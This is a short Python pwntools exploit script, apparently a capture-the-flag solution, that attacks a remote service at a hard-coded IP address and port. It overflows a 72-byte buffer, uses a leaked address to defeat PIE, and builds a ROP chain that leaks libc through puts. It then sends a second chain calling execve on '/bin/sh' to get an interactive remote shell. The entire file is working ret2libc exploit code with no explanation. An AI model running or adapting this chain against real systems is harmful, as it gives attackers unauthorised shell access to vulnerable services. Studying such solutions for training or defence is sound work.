from pwn import *
elf = ELF("./challenge")
context(os="linux", arch="amd64")
# p = elf.process()
p = remote("45.76.177.238", 9333)
offset = 72
p.recvuntil(b"time.\n")
out = int(p.recvline().split(b" ")[-1], 16)
# print(hex(out))
elf.address = out - elf.symbols["banner"]
# print(hex(elf.address))
payload =  b"A"*offset # Garbage
rop = ROP(elf)
rop.call("puts",[elf.got["puts"]])
payload += rop.chain()
payload += p64(elf.symbols["main"])

p.sendline(payload)
out = p.recvline()[0:-1]
# print(out)
out = int.from_bytes(out, "little")
# print(hex(out))
libc = ELF("./libc.so.6")
libc.address = out - libc.sym["puts"]
print(hex(libc.address))
p.recvuntil(b"time.\n")
p.recvline()
rop2 = ROP([elf,libc])
binsh = next(libc.search(b"/bin/sh\x00"))
rop2.execve(binsh, 0, 0)
payload2 =  b"A"*offset + rop2.chain()
# print(rop2.gadgets["ret"])
p.sendline(payload2)
p.interactive()